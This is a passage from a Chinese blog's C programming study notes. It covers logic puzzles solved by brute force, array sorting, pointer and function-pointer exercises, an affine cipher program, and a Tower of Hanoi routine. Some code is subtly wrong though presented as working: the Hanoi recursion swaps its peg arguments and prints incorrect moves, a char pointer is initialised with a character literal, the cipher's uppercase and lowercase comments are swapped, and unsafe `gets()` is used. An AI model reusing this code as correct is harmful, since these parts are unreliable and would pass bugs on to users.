class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/CD8iWgf2mlQUz5G.png" alt="杨辉三角.png"></p><h3 id="凶杀案"><a href="#凶杀案" class="headerlink" title="凶杀案"></a>凶杀案</h3><p>A：不是我</p><p>B：是C </p><p>C：是D </p><p>D：C在胡说 </p><p>三个真话一个假话</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//假设法</span></span><br><span class="line">    <span class="comment">//1为真0为佳，竖着一组</span></span><br><span class="line">    <span class="comment">//A:0 1 1 1</span></span><br><span class="line">    <span class="comment">//B:0 0 1 0</span></span><br><span class="line">    <span class="comment">//C:0 0 0 1</span></span><br><span class="line">    <span class="comment">//D:1 1 1 0</span></span><br><span class="line">    <span class="type">int</span> killer = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (killer = <span class="string">&#x27;A&#x27;</span>; killer &lt;= <span class="string">&#x27;D&#x27;</span>; killer++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((killer !=<span class="string">&#x27;A&#x27;</span>) + (killer == <span class="string">&#x27;C&#x27;</span>) + (killer == <span class="string">&#x27;D&#x27;</span>) + (killer != <span class="string">&#x27;D&#x27;</span>) == <span class="number">3</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;凶手是%c&quot;</span>, killer);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/Y9X8EFRSamPydft.png" alt="凶手是谁.png"></p><h3 id="趣味问题"><a href="#趣味问题" class="headerlink" title="趣味问题"></a>趣味问题</h3><h4 id="燃香问题"><a href="#燃香问题" class="headerlink" title="燃香问题"></a>燃香问题</h4><p>有一根香材质不均匀，燃完一根需要1h，给你两根香，确认一个15min实践段。</p><p>将第一根香两端点燃，这样就确定了一个30min，同时将第一根香一段点燃<br>在第一根香燃烧完后，第二根香就剩30min了，这样再按照第一根香的方法就确定了15min</p><h3 id="拆名次"><a href="#拆名次" class="headerlink" title="拆名次"></a>拆名次</h3><p>A：B第二，我第三<br>B：我第二，E第四<br>C:我第一，D第二<br>D：C最后，我第三<br>E:我第四，A第一<br>每位选手都说对了一半</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> d = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (a = <span class="number">1</span>; a &lt;= <span class="number">5</span>; a++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (b = <span class="number">1</span>; b &lt;= <span class="number">5</span>; b++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (c = <span class="number">1</span>; c &lt;= <span class="number">5</span>; c++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (d = <span class="number">1</span>; d &lt;= <span class="number">5</span>; d++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">for</span> (e = <span class="number">1</span>; e &lt;= <span class="number">5</span>; e++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (((b == <span class="number">2</span>) + (a == <span class="number">3</span>) == <span class="number">1</span>)</span><br><span class="line">                        &amp;&amp; ((b == <span class="number">2</span>) + (e == <span class="number">4</span>) == <span class="number">1</span>) </span><br><span class="line">                        &amp;&amp; ((c == <span class="number">1</span>) + (d == <span class="number">2</span>) == <span class="number">1</span>) </span><br><span class="line">                        &amp;&amp; ((c == <span class="number">5</span>) + (d == <span class="number">3</span>) == <span class="number">1</span>) </span><br><span class="line">                        &amp;&amp; ((e == <span class="number">4</span>) + (a == <span class="number">1</span>) == <span class="number">1</span>)</span><br><span class="line">                        )</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> (a * b * c * d * e == <span class="number">120</span>)</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;a=%d b=%d c=%d d=%d e=%d \n&quot;</span>, a, b, c, d, e);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/waoOR93i4FNjuSV.png" alt="排名.png"></p><h3 id="二维数组列排序"><a href="#二维数组列排序" class="headerlink" title="二维数组列排序"></a>二维数组列排序</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> i, j, k, b[<span class="number">20</span>][<span class="number">20</span>];</span><br><span class="line"><span class="type">int</span> m,n;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;m, &amp;n);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,  &amp;b[i][j]);</span><br><span class="line"><span class="type">int</span> temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; m - j - <span class="number">1</span>; k++)&#123;</span><br><span class="line"><span class="keyword">if</span>(b[k][i] &lt; b[k + <span class="number">1</span>][i])&#123;</span><br><span class="line">temp = b[k][i];</span><br><span class="line">b[k][i] = b[k + <span class="number">1</span>][i];</span><br><span class="line">b[k + <span class="number">1</span>][i] = temp;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n;j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, b[i][j]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/05/4RasZXYOAuoQJh9.png" alt="1111.png"></p><h3 id="3-7-指针"><a href="#3-7-指针" class="headerlink" title="3_7-指针"></a>3_7-指针</h3><h4 id="一级指针传参"><a href="#一级指针传参" class="headerlink" title="一级指针传参"></a>一级指针传参</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECUTE_NO_WARNIG</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span>* ptr, <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, *(ptr + i));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span>* p)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 一级指针传参</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> &#125;;</span><br><span class="line">    <span class="type">int</span>* p = arr;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//p是一级指针</span></span><br><span class="line">    print(p, sz);</span><br><span class="line">    <span class="type">char</span>* ch = <span class="string">&#x27;w&#x27;</span>; <span class="comment">// 数组名是首地址</span></span><br><span class="line">    <span class="type">char</span>* p1 = &amp;ch; <span class="comment">//对于其它类型的变量需要取地址</span></span><br><span class="line">    test(&amp;ch);      <span class="comment">//取地址完再存放到同类型的指针变量也行</span></span><br><span class="line">    test(p1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="二级指传参"><a href="#二级指传参" class="headerlink" title="二级指传参"></a>二级指传参</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECUTE_NO_WARNIG</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span>** p2)</span></span><br><span class="line">&#123;</span><br><span class="line">    **p2 = <span class="number">20</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span>* pa = &amp;a;<span class="comment">//pa一级指针</span></span><br><span class="line">    <span class="type">int</span>** ppa = &amp;pa;<span class="comment">//ppa是二级指针</span></span><br><span class="line">    <span class="comment">//把二级指针进行传参？</span></span><br><span class="line">    test(ppa);</span><br><span class="line">    test(&amp;pa);<span class="comment">//传一级指针变量的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECUTE_NO_WARNIG</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">Add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span>* pa = &amp;a;</span><br><span class="line">    </span><br><span class="line">    <span class="type">char</span> ch = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">    <span class="type">char</span>* pc = &amp;ch;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">int</span> (*parr)[<span class="number">10</span>] = &amp;arr;<span class="comment">//取出数组的地址</span></span><br><span class="line">    <span class="comment">//parr 是指向数组的指针 - 存放的是数组的地址</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//函数指针-存放函数地址的指针</span></span><br><span class="line">    <span class="comment">//&amp;函数名- 取到的是函数的地址</span></span><br><span class="line">    <span class="comment">//数组名 != &amp;数组名 函数名 == &amp;函数名</span></span><br><span class="line">    <span class="comment">//pf就是一个函数指针变量</span></span><br><span class="line">    <span class="type">int</span> (*pf)(<span class="type">int</span>, <span class="type">int</span>) = &amp;Add;<span class="comment">//</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//printf(&quot;%p\n&quot;, &amp;Add);</span></span><br><span class="line">    <span class="comment">//printf(&quot;%p\n&quot;, Add);//结果一样</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>练习</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">char</span>* str)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> (*pt)(<span class="type">char</span>*) = &amp;test;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> (*pf)(<span class="type">int</span>, <span class="type">int</span>) = &amp;Add;<span class="comment">//</span></span><br><span class="line">    <span class="type">int</span> ret = (*pf)(<span class="number">3</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ret);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//另外的写法</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    int (*pf)(int, int) = Add;//</span></span><br><span class="line"><span class="comment">    //int ret = (*pf)(3, 5);</span></span><br><span class="line"><span class="comment">    int ret = pf(3, 5);</span></span><br><span class="line"><span class="comment">    printf(&quot;%d\n&quot;, ret);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="阅读俩段代码"><a href="#阅读俩段代码" class="headerlink" title="阅读俩段代码"></a>阅读俩段代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//代码1</span></span><br><span class="line">(*(<span class="type">void</span> (*)())<span class="number">0</span>)();</span><br><span class="line"><span class="comment">//调用0地址的函数，该函数无参，发返回类型是void</span></span><br><span class="line"><span class="comment">//1.void (*)() 函数指针类型</span></span><br><span class="line"><span class="comment">//2. ((void (*)()0 对0进行强制类型转化，被解释为一个函数地址</span></span><br><span class="line"><span class="comment">//3.(*(void (*)())0)() 调用0地址处的函数</span></span><br><span class="line"><span class="comment">//代码2</span></span><br><span class="line"><span class="type">void</span> (*signal(<span class="type">int</span> , <span class="type">void</span>(*)(<span class="type">int</span>)))(<span class="type">int</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//1. signal(int, void(*)(int)) + void(*)(int)</span></span><br><span class="line"><span class="comment">//2.signal和()先结合，说明signal是函数名</span></span><br><span class="line"><span class="comment">//3.signal函数的第一个参数类型是int，第二个参数的类型是函数指针</span></span><br><span class="line"><span class="comment">//该函数指针指向一个参数为int返回类型是void的函数</span></span><br><span class="line"><span class="comment">//4.signal函数的返回类型也是一个函数指针该函数指针指向一个参数为int，返回类型是void的函数</span></span><br><span class="line"><span class="comment">//5.signal是一个函数的声明</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span><span class="params">(*<span class="type">pfun_t</span>)</span><span class="params">(<span class="type">int</span>)</span>;<span class="comment">//对void(*)(int)的函数指针型重命名为pfun_t</span></span><br><span class="line"><span class="comment">//typedef unsigned int uint;</span></span><br><span class="line"></span><br><span class="line"><span class="type">pfun_t</span> <span class="title function_">signal</span><span class="params">(<span class="type">int</span>, <span class="type">pfun_t</span>)</span>;</span><br></pre></td></tr></table></figure><h3 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Affine</span><span class="params">()</span> <span class="comment">/* 仿射密码 */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> length, i = <span class="number">0</span>, ka = <span class="number">0</span>, kb = <span class="number">0</span>, tmp;</span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;********仿射密码********\n请输入最初的明文:&quot;</span>);</span><br><span class="line">    gets(c);</span><br><span class="line">    length = <span class="built_in">strlen</span>(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入秘钥（两数字）：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;ka, &amp;kb);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">while</span> (gcd(ka,<span class="number">26</span>) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;秘钥输入错误，请重新输入：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;ka, &amp;kb);</span><br><span class="line">        getchar(); </span><br><span class="line">     &#125; </span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="comment">//大写字母 </span></span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt; <span class="number">96</span> &amp;&amp; c[i] &lt; <span class="number">123</span>)</span><br><span class="line">            c[i] = (ka * (c[i] - <span class="number">97</span>) + kb) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">        <span class="comment">//小写字母 </span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c[i] &gt; <span class="number">64</span> &amp;&amp; c[i] &lt; <span class="number">91</span>)</span><br><span class="line">            c[i] = (ka * (c[i] - <span class="number">65</span>) + kb) % <span class="number">26</span> + <span class="number">65</span>;   </span><br><span class="line">     &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n密文为：\n%s\n&quot;</span>, c);</span><br><span class="line">    <span class="comment">//printf(&quot;********请安1~3选择：********\n&quot;);</span></span><br><span class="line">    <span class="comment">//printf(&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;);</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="comment">/* 求最大公因数 */</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        k = a % b;</span><br><span class="line">        a = b;</span><br><span class="line">        b = k;</span><br><span class="line">    &#125; <span class="keyword">while</span>(k != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line"> &#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">exAffine</span><span class="params">()</span> <span class="comment">/* 仿射加密 */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">100</span>];</span><br><span class="line">    <span class="type">int</span> length, i = <span class="number">0</span>, ka = <span class="number">0</span>, kb = <span class="number">0</span>, tmp;</span><br><span class="line">    system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;********仿射密码*******\n请输入最初的密文：&quot;</span>);</span><br><span class="line">    gets(c);</span><br><span class="line">    length = <span class="built_in">strlen</span>(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入秘钥（两数字）：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;ka, &amp;kb);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">while</span> (gcd(ka,<span class="number">26</span>) != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;秘钥输入错误，请重新输入：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;ka, &amp;kb);</span><br><span class="line">        getchar(); </span><br><span class="line">     &#125; </span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="comment">//大写字母 </span></span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt; <span class="number">64</span> &amp;&amp; c[i] &lt; <span class="number">91</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            tmp = Ni(ka, <span class="number">26</span>) * ((c[i] - <span class="number">65</span>) - kb);</span><br><span class="line">            <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>)</span><br><span class="line">                c[i] = tmp % <span class="number">26</span> + <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                c[i] = tmp % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">//小写字母 </span></span><br><span class="line">         <span class="keyword">if</span> (c[i] &gt; <span class="number">96</span> &amp;&amp; c[i] &lt; <span class="number">123</span>)</span><br><span class="line">         &#123;</span><br><span class="line">            tmp = Ni(ka, <span class="number">26</span>) * ((c[i] - <span class="number">97</span>) - kb);</span><br><span class="line">            <span class="keyword">if</span> (tmp &lt; <span class="number">0</span>)</span><br><span class="line">                c[i] = tmp % <span class="number">26</span> + <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                c[i] = tmp % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n明文为：\n %s \n&quot;</span>, c);</span><br><span class="line">    <span class="comment">//printf(&quot;********请安1~3选择：********\n&quot;);</span></span><br><span class="line">    <span class="comment">//printf(&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;);</span></span><br><span class="line">    </span><br><span class="line"> &#125; </span><br><span class="line"><span class="type">int</span> <span class="title function_">Ni</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (a * (++i) % b != <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> i = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;********请按1~3选择：********\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;</span>);</span><br><span class="line">    <span class="comment">//scanf(&quot;%c&quot;, &amp;i);</span></span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line">    i = getch(); </span><br><span class="line">    <span class="keyword">while</span> (i != <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            Affine();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">            exAffine();</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;********请按1~3选择：********\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1.仿射加密\n2/仿射解密\n3.退出\n&quot;</span>);</span><br><span class="line">        i = getch();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 俩层 </span></span><br><span class="line"><span class="comment">/*  三层 </span></span><br><span class="line"><span class="comment">1: A-&gt;C</span></span><br><span class="line"><span class="comment">2: A-&gt;B A-&gt;C B-&gt;C</span></span><br><span class="line"><span class="comment">3: A-&gt;C A-&gt;B C-&gt;B A-&gt;C B-&gt;A B-&gt;C A-&gt;C</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">move</span><span class="params">(<span class="type">char</span> pos1, <span class="type">char</span> pos2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c-&gt;%c &quot;</span>, pos1, pos2);</span><br><span class="line"> &#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">Hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> pos1, <span class="type">char</span> pos2, <span class="type">char</span> pos3)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        move(pos1, pos3);   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Hanoi(n - <span class="number">1</span>, pos1, pos2, pos3);</span><br><span class="line">        move(pos1, pos3);</span><br><span class="line">        Hanoi(n - <span class="number">1</span>, pos2, pos1, pos3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">N:代表盘子个数</span></span><br><span class="line"><span class="comment">pos1:起始位置 </span></span><br><span class="line"><span class="comment">pos2:中转位置</span></span><br><span class="line"><span class="comment">pos3:目的位置</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Hanoi(<span class="number">1</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    Hanoi(<span class="number">2</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    Hanoi(<span class="number">3</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/09/17KRvbOmujZaqi8.png" alt="image.png"></p><h3 id="3-10"><a href="#3-10" class="headerlink" title="3_10"></a>3_10</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span 